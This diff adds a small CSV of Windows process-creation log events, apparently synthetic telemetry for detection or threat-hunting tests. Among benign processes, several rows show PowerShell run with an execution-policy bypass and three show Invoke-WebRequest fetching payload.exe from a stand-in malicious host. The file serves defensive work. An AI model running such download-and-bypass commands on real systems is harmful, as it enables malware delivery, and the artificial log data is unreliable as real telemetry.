@@ -1,0 +1,14 @@
+_time,EventCode,Image,CommandLine,ParentImage,User,Host
+2026-04-01T09:00:00,1,C:\Windows\explorer.exe,explorer.exe,C:\Windows\winlogon.exe,alice,host1
+2026-04-01T09:01:00,1,C:\Program Files\Google\Chrome\chrome.exe,chrome.exe https://www.google.com,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:02:00,1,C:\Windows\System32\cmd.exe,cmd.exe /c dir,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:03:00,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe Get-Process,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:04:00,1,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:05:00,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ExecutionPolicy Bypass -File script.ps1,C:\Windows\System32\cmd.exe,alice,host1
+2026-04-01T09:05:30,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe Invoke-WebRequest http://malicious-site.com/payload.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,alice,host1
+2026-04-01T09:06:00,1,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File script.ps1,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:06:30,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe Invoke-WebRequest http://malicious-site.com/payload.exe,C:\Windows\System32\cmd.exe,alice,host1
+2026-04-01T09:07:00,1,C:\Windows\System32\svchost.exe,svchost.exe -k netsvcs,C:\Windows\System32\services.exe,SYSTEM,host1
+2026-04-01T09:08:00,1,C:\Program Files\Google\Chrome\chrome.exe,chrome.exe https://github.com,C:\Windows\explorer.exe,alice,host1
+2026-04-01T09:09:00,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe Invoke-WebRequest http://malicious-site.com/payload.exe,C:\Windows\System32\cmd.exe,alice,host1
+2026-04-01T09:10:00,1,C:\Windows\notepad.exe,notepad.exe,C:\Windows\explorer.exe,alice,host1
